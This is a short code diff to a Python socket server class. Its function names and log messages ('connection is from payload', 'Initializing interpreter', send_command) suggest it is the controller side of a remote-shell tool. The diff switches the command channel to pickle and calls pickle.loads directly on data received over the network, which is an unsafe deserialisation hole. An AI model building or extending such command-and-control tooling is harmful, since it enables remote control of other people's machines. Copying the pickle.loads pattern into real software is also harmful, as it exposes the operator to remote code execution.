@@ -8,6 +8,7 @@ import logging
 import select
 import signal
 import socket
+import pickle
 import queue
 import json
 import time
@@ -165,7 +166,7 @@ class PyServerSocket():
 
     def is_shell(self):
         logging.debug("Validating if connection is from payload")
-        self.client_socket.sendall(b"echo pluh") # Change this later
+        self.client_socket.sendall(pickle.dumps("echo pluh".split(" "))) # Change this later
         check = pretty(self.client_socket.recv(1024))
         if check:
             logging.info("Initializing interpreter")
@@ -202,15 +203,15 @@ class PyServerSocket():
         return self.crypto.decrypt_message(bytes(data_bytes), self.derived_key)
 
     def send_command(self, msg):
-        self.send_msg(msg)
-        msg = self.recv_msg()
+        self.send_msg(pickle.dumps(msg))
+        data = pickle.loads(self.recv_msg())
         
-        if b"[Errno " in msg:
+        if type(data) == str and "[Errno " in data:
             is_err = True
         else:
             is_err = False
             
-        return [is_err, msg]
+        return [is_err, data]
 
 
     def close(self):
